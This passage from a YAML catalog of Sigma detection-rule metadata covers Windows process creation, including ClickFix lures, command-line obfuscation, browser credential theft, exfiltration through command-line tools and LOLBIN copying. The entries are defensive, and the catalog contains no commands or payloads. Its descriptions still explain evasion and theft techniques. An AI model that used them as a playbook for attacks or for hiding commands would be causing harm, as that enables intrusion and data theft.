    One trivial example of this is using rundll32.exe without arguments as a sacrificial
    process (default in CS, now highlighted by c2lint), running WerFault without arguments
    (Kraken - credit am0nsec), and other examples.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  time_window: ''
  references:
  - https://blog.malwarebytes.com/malwarebytes-news/2020/10/kraken-attack-abuses-wer-service/
  - https://www.cobaltstrike.com/help-opsec
  - https://twitter.com/CyberRaiju/status/1251492025678983169
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32
  - https://learn.microsoft.com/en-us/dotnet/framework/tools/regasm-exe-assembly-registration-tool
  - https://learn.microsoft.com/en-us/dotnet/framework/tools/regsvcs-exe-net-services-installation-tool
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1193d960-2369-499f-a158-7b50a31df682
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_browser_launch_from_document_reader_process.yml
  name: Potential Suspicious Browser Launch From Document Reader Process
  description: 'Detects when a browser process or browser tab is launched from an
    application that handles document files such as Adobe, Microsoft Office, etc.
    And connects to a web application over http(s), this could indicate a possible
    phishing attempt.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.002
  tags:
  - attack.execution
  - attack.t1204.002
  time_window: ''
  references:
  - https://app.any.run/tasks/69c5abaa-92ad-45ba-8c53-c11e23e05d04/
  - https://app.any.run/tasks/64043a79-165f-4052-bcba-e6e49f847ec1/
  false_positives:
  - Unlikely in most cases, further investigation should be done in the commandline
    of the browser process to determine the context of the URL accessed.
  notes: ''
- detection_id: 590a5f4c-6c8c-4f10-8307-89afe9453a9d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_child_process_as_system_.yml
  name: Suspicious Child Process Created as System
  description: Detection of child processes spawned with SYSTEM privileges by parents
    with LOCAL SERVICE or NETWORK SERVICE accounts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1134.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1134.002
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment
  - https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
  - https://github.com/antonioCoco/RogueWinRM
  - https://twitter.com/Cyb3rWard0g/status/1453123054243024897
  false_positives:
  - Unknown
  notes: ''
- detection_id: f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_cli_obfuscation_escape_char.yml
  name: Potential Commandline Obfuscation Using Escape Characters
  description: Detects potential commandline obfuscation using known escape characters
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1140
  tags:
  - attack.defense-evasion
  - attack.t1140
  time_window: ''
  references:
  - https://twitter.com/vysecurity/status/885545634958385153
  - https://twitter.com/Hexacorn/status/885553465417756673
  - https://twitter.com/Hexacorn/status/885570278637678592
  - https://www.mandiant.com/resources/blog/obfuscation-wild-targeted-attackers-lead-way-evasion-techniques
  - https://web.archive.org/web/20190213114956/http://www.windowsinspired.com/understanding-the-command-line-string-and-arguments-received-by-a-windows-program/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 584bca0f-3608-4402-80fd-4075ff6072e3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_cli_obfuscation_unicode_img.yml
  name: Potential CommandLine Obfuscation Using Unicode Characters From Suspicious
    Image
  description: 'Detects potential commandline obfuscation using unicode characters.

    Adversaries may attempt to make an executable or file difficult to discover or
    analyze by encrypting, encoding, or otherwise obfuscating its contents on the
    system or in transit.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027
  tags:
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1027/T1027.md#atomic-test-6---dlp-evasion-via-sensitive-data-in-vba-macro-over-http
  false_positives:
  - Unknown
  notes: ''
- detection_id: d487ed4a-fd24-436d-a0b2-f4e95f7b2635
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_clickfix_filefix_execution.yml
  name: Suspicious ClickFix/FileFix Execution Pattern
  description: 'Detects suspicious execution patterns where users are tricked into
    running malicious commands via clipboard manipulation, either through the Windows
    Run dialog (ClickFix) or File Explorer address bar (FileFix).

    Attackers leverage social engineering campaignssuch as fake CAPTCHA challenges
    or urgent alertsencouraging victims to paste clipboard contents, often executing
    mshta.exe, powershell.exe, or similar commands to infect systems.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.001
  - T1204.004
  tags:
  - attack.execution
  - attack.t1204.001
  - attack.t1204.004
  time_window: ''
  references:
  - https://github.com/JohnHammond/recaptcha-phish
  - https://www.zscaler.com/blogs/security-research/deepseek-lure-using-captchas-spread-malware
  - https://www.threatdown.com/blog/clipboard-hijacker-tries-to-install-a-trojan/
  - https://app.any.run/tasks/5c16b4db-4b36-4039-a0ed-9b09abff8be2
  - https://www.esentire.com/security-advisories/netsupport-rat-clickfix-distribution
  - https://www.scpx.com.au/2025/11/16/decades-old-finger-protocol-abused-in-clickfix-malware-attacks/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 3ae9974a-eb09-4044-8e70-8980a50c12c8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_clickfix_filefix_whitespace_padding.yml
  name: Suspicious Explorer Process with Whitespace Padding - ClickFix/FileFix
  description: 'Detects process creation with suspicious whitespace padding followed
    by a ''#'' character, which may indicate ClickFix or FileFix techniques used to
    conceal malicious commands from visual inspection.

    ClickFix and FileFix are social engineering attack techniques where adversaries
    distribute phishing documents or malicious links that deceive users into opening
    the Windows Run dialog box or File Explorer search bar.

    The victims are then instructed to paste commands from their clipboard, which
    contain extensive whitespace padding using various Unicode space characters to
    push the actual malicious command far to the right, effectively hiding it from
    immediate view.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027.010
  - T1204.004
  tags:
  - attack.execution
  - attack.t1204.004
  - attack.defense-evasion
  - attack.t1027.010
  time_window: ''
  references:
  - https://expel.com/blog/cache-smuggling-when-a-picture-isnt-a-thousand-words/
  - https://mrd0x.com/filefix-clickfix-alternative/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2782fbd8-b662-4eb5-9962-5bfbfb671e7b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_cmd_for_loop_execution_with_recursive_directory_search.yml
  name: Suspicious Usage of For Loop with Recursive Directory Search in CMD
  description: 'Detects suspicious usage of the cmd.exe ''for /f'' loop combined with
    the ''tokens='' parameter and a recursive directory listing.

    This pattern may indicate an attempt to discover and execute system binaries dynamically,
    for example powershell, a technique sometimes used by attackers to evade detection.

    This behavior has been observed in various malicious lnk files.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - multi_signal_correlation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027.010
  - T1059.003
  tags:
  - attack.execution
  - attack.t1059.003
  - attack.defense-evasion
  - attack.t1027.010
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/29837d0d3202758063185828c8f8d9e0b7b42b365c8941cc926d2d7c7bae2fb3
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1327381e-6ab0-4f38-b583-4c1b8346a56b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_commandline_path_traversal_evasion.yml
  name: Potential Command Line Path Traversal Evasion Attempt
  description: Detects potential evasion or obfuscation attempts using bogus path
    traversal via the commandline
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - https://twitter.com/hexacorn/status/1448037865435320323
  - https://twitter.com/Gal_B1t/status/1062971006078345217
  false_positives:
  - Google Drive
  - Citrix
  notes: ''
- detection_id: 47147b5b-9e17-4d76-b8d2-7bac24c5ce1b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_copy_browser_data.yml
  name: Potential Browser Data Stealing
  description: 'Adversaries may acquire credentials from web browsers by reading files
    specific to the target browser.

    Web browsers commonly save credentials such as website usernames and passwords
    so that they do not need to be entered manually in the future.

    Web browsers typically store the credentials in an encrypted format within a credential
    store.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1555.003
  tags:
  - attack.credential-access
  - attack.t1555.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555.003/T1555.003.md
  - https://www.cisa.gov/sites/default/files/2024-04/aa24-109a-stopransomware-akira-ransomware_2.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_copy_lateral_movement.yml
  name: Copy From Or To Admin Share Or Sysvol Folder
  description: Detects a copy command or a copy utility execution to or from an Admin
    share or remote
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  - Exfiltration
  techniques:
  - T1021.002
  - T1039
  - T1048
  tags:
  - attack.lateral-movement
  - attack.collection
  - attack.exfiltration
  - attack.t1039
  - attack.t1048
  - attack.t1021.002
  time_window: ''
  references:
  - https://twitter.com/SBousseaden/status/1211636381086339073
  - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view
  - https://www.elastic.co/guide/en/security/current/remote-file-copy-to-a-hidden-share.html
  - https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/
  false_positives:
  - Administrative scripts
  notes: ''
- detection_id: fff9d2b7-e11c-4a69-93d3-40ef66189767
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir.yml
  name: Suspicious Copy From or To System Directory
  description: 'Detects a suspicious copy operation that tries to copy a program from
    system (System32, SysWOW64, WinSxS) directories to another on disk.

    Often used to move LOLBINs such as ''certutil'' or ''desktopimgdownldr'' to a
    different location with a different name in order to bypass detections based on
    locations.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.003
  tags:
  - attack.defense-evasion
  - attack.t1036.003
  time_window: ''
  references:
  - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120
  - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html
  - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/
  false_positives:
  - Depend on scripts and administrative tools used in the monitored environment (For
    example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)
  - When cmd.exe and xcopy.exe are called directly
  - When the command contains the keywords but not in the correct order
  notes: ''
- detection_id: f5d19838-41b5-476c-98d8-ba8af4929ee2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir_lolbin.yml
  name: LOL-Binary Copied From System Directory
  description: 'Detects a suspicious copy operation that tries to copy a known LOLBIN
    from system (System32, SysWOW64, WinSxS) directories to another on disk in order
    to bypass detections based on locations.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.003
  tags:
  - attack.defense-evasion
  - attack.t1036.003
  time_window: ''
  references:
  - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120
  - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html
  - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/
  - https://www.virustotal.com/gui/file/14e722855605ba78dc1d21153f0e1be90e7528149f2cd2d7d6eba8ef27534bdc/behavior
  false_positives:
  - Unknown
  notes: ''
- detection_id: 66c3b204-9f88-4d0a-a7f7-8a57d521ca55
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_crypto_mining_monero.yml
  name: Potential Crypto Mining Activity
  description: Detects command line parameters or strings often used by crypto miners
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1496
  tags:
  - attack.impact
  - attack.t1496
  time_window: ''
  references:
  - https://www.poolwatch.io/coin/monero
  false_positives:
  - Legitimate use of crypto miners
  - Some build frameworks
  notes: ''
- detection_id: 7d1aaf3d-4304-425c-b7c3-162055e0b3ab
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_data_exfiltration_via_cli.yml
  name: Potential Data Exfiltration Activity Via CommandLine Tools
  description: Detects the use of various CLI utilities exfiltrating data via web
    requests
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_disable_raccine.yml
  name: Raccine Uninstall
  description: Detects commands that indicate a Raccine removal from an end system.
    Raccine is a free ransomware protection tool.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/Neo23x0/Raccine
  false_positives:
  - Legitimate deinstallation by administrative staff
  notes: ''
- detection_id: 1cdd9a09-06c9-4769-99ff-626e2b3991b8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_double_extension.yml
  name: Suspicious Double Extension File Execution
  description: Detects suspicious use of an .exe extension after a non-executable
    file extension like .pdf.exe, a set of spaces or underlines to cloak the executable
    file in spear phishing campaigns
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1566.001
  tags:
  - attack.initial-access
  - attack.t1566.001
  time_window: ''
  references:
  - https://blu3-team.blogspot.com/2019/06/misleading-extensions-xlsexe-docexe.html
  - https://twitter.com/blackorbird/status/1140519090961825792
  - https://cloud.google.com/blog/topics/threat-intelligence/cybercriminals-weaponize-fake-ai-websites
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5e6a80c8-2d45-4633-9ef4-fa2671a39c5c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_double_extension_parent.yml
  name: Suspicious Parent Double Extension File Execution
  description: Detect execution of suspicious double extension files in ParentCommandLine
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.007
  tags:
  - attack.defense-evasion
  - attack.t1036.007
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/7872d8845a332dce517adae9c3389fde5313ff2fed38c2577f3b498da786db68/behavior
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bluebottle-banks-targeted-africa
  false_positives:
  - Unknown
  notes: ''
- detection_id: 00d49ed5-4491-4271-a8db-650a4ef6f8c1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_download_office_domain.yml
  name: Suspicious Download from Office Domain
  description: Detects suspicious ways to download files from Microsoft domains that
    are used to store attachments in Emails or OneNote documents
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  - T1608
  tags:
  - attack.command-and-control
  - attack.resource-development
  - attack.t1105
  - attack.t1608
  time_window: ''
  references:
  - https://twitter.com/an0n_r0/status/1474698356635193346?s=12
  - https://twitter.com/mrd0x/status/1475085452784844803?s=12
  false_positives:
  - Scripts or tools that download attachments from these domains (OneNote, Outlook
    365)
  notes: ''
- detection_id: 4f647cfa-b598-4e12-ad69-c68dd16caef8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_dumpstack_log_evasion.yml
  name: DumpStack.log Defender Evasion
  description: Detects the use of the filename DumpStack.log to evade Microsoft Defender
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://twitter.com/mrd0x/status/1479094189048713219
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1e53dd56-8d83-4eb4-a43e-b790a05510aa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_elavated_msi_spawned_shell.yml
  name: Always Install Elevated MSI Spawned Cmd And Powershell
  description: Detects Windows Installer service (msiexec.exe) spawning "cmd" or "powershell"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-50-638.jpg
  false_positives:
  - Unknown
  notes: ''
- detection_id: f26eb764-fd89-464b-85e2-dc4a8e6e77b8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_electron_app_children.yml
  name: Suspicious Electron Application Child Processes
  description: 'Detects suspicious child processes of electron apps (teams, discord,
    slack, etc.). This could be a potential sign of ".asar" file tampering (See reference
    section for more information) or binary execution proxy through specific CLI arguments
    (see related rule)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://taggart-tech.com/quasar-electron/
  - https://github.com/mttaggart/quasar
  - https://positive.security/blog/ms-officecmd-rce
  - https://lolbas-project.github.io/lolbas/Binaries/Msedge/
  - https://lolbas-project.github.io/lolbas/Binaries/Teams/
  - https://lolbas-project.github.io/lolbas/Binaries/msedgewebview2/
  - https://medium.com/@MalFuzzer/one-electron-to-rule-them-all-dc2e9b263daf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 378a05d8-963c-46c9-bcce-13c7657eac99
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_electron_execution_proxy.yml
  name: Potentially Suspicious Electron Application CommandLine
  description: Detects potentially suspicious CommandLine of electron apps (teams,
    discord, slack, etc.). This could be a sign of abuse to proxy execution through
    a signed binary.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://positive.security/blog/ms-officecmd-rce
  - https://lolbas-project.github.io/lolbas/Binaries/Teams/
  - https://lolbas-project.github.io/lolbas/Binaries/Msedge/
  - https://lolbas-project.github.io/lolbas/Binaries/msedgewebview2/
  - https://medium.com/@MalFuzzer/one-electron-to-rule-them-all-dc2e9b263daf
  - https://chromium.googlesource.com/chromium/chromium/+/master/content/public/common/content_switches.cc
  false_positives:
  - Legitimate usage for debugging purposes
  notes: ''
- detection_id: 178e615d-e666-498b-9630-9ed363038101
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_elevated_system_shell_uncommon_parent.yml
  name: Elevated System Shell Spawned From Uncommon Parent Location
  description: Detects when a shell program such as the Windows command prompt or
    PowerShell is launched with system privileges from a uncommon parent location.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://github.com/Wh04m1001/SysmonEoP
  false_positives:
  - Some legitimate applications may spawn shells from uncommon parent locations.
    Apply additional filters and perform an initial baseline before deploying.
  notes: ''
- detection_id: 30e92f50-bb5a-4884-98b5-d20aa80f3d7a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_embed_exe_lnk.yml
  name: Hidden Powershell in Link File Pattern
  description: Detects events that appear when a user click on a link file with a
    powershell command in it
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://www.x86matthew.com/view_post?id=embed_exe_lnk
  false_positives:
  - Legitimate commands in .lnk files
  notes: ''
- detection_id: 4a30ac0c-b9d6-4e01-b71a-5f851bbf4259
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_emoji_usage_in_cli_1.yml
  name: Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 1
  description: Detects the usage of emojis in the command line, this could be a sign
    of potential defense evasion activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: c98f2a0d-e1b8-4f76-90d3-359caf88d6b9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_emoji_usage_in_cli_2.yml
  name: Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 2
  description: Detects the usage of emojis in the command line, this could be a sign
    of potential defense evasion activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: f9578658-9e71-4711-b634-3f9b50cd3c06
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_emoji_usage_in_cli_3.yml
  name: Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 3
  description: Detects the usage of emojis in the command line, this could be a sign
    of potential defense evasion activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 225274c4-8dd1-40db-9e09-71dff4f6fb3c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_emoji_usage_in_cli_4.yml
  name: Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 4
  description: Detects the usage of emojis in the command line, this could be a sign
    of potential defense evasion activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 41421f44-58f9-455d-838a-c398859841d4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_etw_modification_cmdline.yml
  name: ETW Logging Tamper In .NET Processes Via CommandLine
  description: 'Detects changes to environment variables related to ETW logging via
    the CommandLine.

    This could indicate potential adversaries stopping ETW providers recording loaded
    .NET assemblies.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  time_window: ''
  references:
  - https://twitter.com/_xpn_/status/1268712093928378368
  - https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr
